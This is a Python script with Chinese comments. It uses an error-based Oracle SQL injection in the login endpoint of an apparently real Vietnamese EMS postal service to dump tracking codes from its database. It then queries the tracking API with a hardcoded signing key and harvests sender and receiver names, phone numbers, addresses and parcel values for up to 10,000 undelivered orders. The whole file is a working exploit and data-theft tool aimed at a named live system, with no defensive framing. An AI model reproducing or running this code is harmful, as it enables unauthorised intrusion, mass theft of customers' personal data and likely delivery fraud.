#!/usr/bin/env python3
"""
提取10,000个未签收订单
策略：从最近日期开始，逐天提取验证，直到凑够10,000个
"""
import requests
import time
import json
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
import threading

# API配置
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
API_URL = "https://api-dingdong.ems.com.vn/api/TrackTrace/Lading"

# 全局统计
lock = threading.Lock()
total_found = 0
total_checked = 0

def inject(payload):
    """SQL注入"""
    data = {'Username': payload, 'Password': 'test'}
    try:
        return requests.post('https://customerconnect.ems.com.vn/api/User_Customer/Login', 
                           json=data, timeout=20)
    except:
        return None

def extract(query, retries=3):
    """提取数据"""
    for attempt in range(retries):
        payload = f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1325=CTXSYS.DRITHSX.SN(1325,(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||({query})||CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        r = inject(payload)
        if r and r.text and 'qjvjq' in r.text:
            try:
                s = r.text.index('qjvjq')+5
                return r.text[s:r.text.index('qkvzq',s)]
            except:
                pass
        if attempt < retries - 1:
            time.sleep(1)
    return None

def generate_signature(code):
    """生成API签名"""
    data = code.upper() + PRIVATE_KEY
    return hashlib.sha256(data.encode('utf-8')).hexdigest().upper()

def verify_tracking(code):
    """验证运单号并检查是否未签收"""
    global total_checked
    
    signature = generate_signature(code)
    payload = {'LadingCode': code.upper(), 'Signature': signature}
    
    try:
        response = requests.post(API_URL, json=payload, timeout=8)
        result = response.json()
        
        with lock:
            total_checked += 1
        
        if result.get('Code') == '00':
            data = result.get('Value', {})
            
            # 只要未签收的
            signed = bool(data.get('SignatureCapture'))
            if signed:
                return None
            
            # 未签收，返回信息
            info = {
                'code': code,
                'signed': False,
                'value': data.get('Value', 0) or 0,
                'fee': data.get('Fee', 0) or 0,
                'sender': data.get('SenderName', ''),
                'receiver': data.get('ReceiverName', ''),
                'receiver_phone': data.get('ReceiverMobile', ''),
                'sender_phone': data.get('SenderMobile', ''),
                'receiver_address': data.get('ReceiverAddress', ''),
            }
            return info
            
    except Exception as e:
        pass
    
    time.sleep(0.05)
    return None

def extract_tracking_numbers(date_str, max_extract=2000):
    """从数据库提取指定日期的运单号（逐个提取）"""
    print(f"📦 提取 {date_str} 的数据...")
    
    # 获取总数
    total_query = f"SELECT TO_CHAR(COUNT(DISTINCT ITEMCODE)) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date_str}' AND ITEMCODE LIKE 'E%VN'"
    total = extract(total_query)
    
    if not total or total == '0':
        print(f"   ❌ {date_str} 无数据")
        return []
    
    total_num = int(total)
    print(f"   📊 共 {total_num} 个运单号 (提取前{max_extract}个)")
    
    tracking_numbers = []
    extract_count = min(total_num, max_extract)
    
    # 逐个提取
    for i in range(1, extract_count + 1):
        query = f"""SELECT ITEMCODE FROM 
                   (SELECT ITEMCODE,ROWNUM AS RN FROM 
                   (SELECT DISTINCT ITEMCODE FROM EMS.JOURNEYTOKEN_ZNS 
                   WHERE TOKENDATE='{date_str}' AND ITEMCODE LIKE 'E%VN' 
                   ORDER BY ITEMCODE) 
                   WHERE ROWNUM<={i}) 
                   WHERE RN={i}"""
        
        result = extract(query)
        if result:
            tracking_numbers.append(result)
            if i % 100 == 0:
                print(f"   ✅ 已提取 {i}/{extract_count}", end='\r')
        
        time.sleep(0.05)
    
    print(f"   ✅ 提取完成: {len(tracking_numbers)} 个")
    return tracking_numbers

def save_results(results, filename='unsigned_10000.json'):
    """保存结果"""
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    
    # 同时保存运单号列表
    txt_file = filename.replace('.json', '.txt')
    with open(txt_file, 'w', encoding='utf-8') as f:
        for item in results:
            f.write(f"{item['code']}\n")
    
    print(f"\n💾 已保存:")
    print(f"   {filename}")
    print(f"   {txt_file}")

def main():
    global total_found, total_checked
    
    print("="*80)
    print("🎯 目标: 提取10,000个未签收订单")
    print("="*80)
    print()
    
    # 测试连接
    if not inject('test'):
        print("❌ 数据库连接失败")
        return
    
    results = []
    
    # 从今天往前推15天
    start_date = datetime.now()
    
    for days_ago in range(15):
        if total_found >= 10000:
            break
        
        current_date = start_date - timedelta(days=days_ago)
        date_str = current_date.strftime('2025%m%d')  # 数据库时间是2025年
        
        print(f"\n{'='*80}")
        print(f"📅 处理日期: {date_str}")
        print(f"{'='*80}")
        
        # 提取运单号
        tracking_numbers = extract_tracking_numbers(date_str)
        
        if not tracking_numbers:
            continue
        
        print(f"\n🔍 开始验证 {len(tracking_numbers)} 个运单号...")
        print(f"   当前进度: {total_found}/10000")
        
        # 多线程验证
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(verify_tracking, code): code 
                      for code in tracking_numbers}
            
            for future in as_completed(futures):
                if total_found >= 10000:
                    break
                
                info = future.result()
                if info:
                    results.append(info)
                    total_found += 1
                    
                    if total_found % 10 == 0:
                        print(f"   ✅ 找到: {total_found}/10000 | 已验证: {total_checked}", end='\r')
                
                time.sleep(0.1)
        
        print(f"\n   ✅ {date_str} 完成: 找到 {total_found - len([r for r in results if r not in results[-total_found:]])} 个")
        
        # 定期保存
        if total_found > 0 and total_found % 1000 == 0:
            save_results(results, f'unsigned_{total_found}.json')
    
    print("\n" + "="*80)
    print("🎉 提取完成！")
    print("="*80)
    print(f"✅ 成功找到: {total_found} 个未签收订单")
    print(f"📊 总共验证: {total_checked} 个运单号")
    print(f"✨ 有效率: {total_found/total_checked*100:.2f}%")
    print("="*80)
    
    # 保存最终结果
    if results:
        save_results(results, 'unsigned_final.json')

if __name__ == '__main__':
    main()
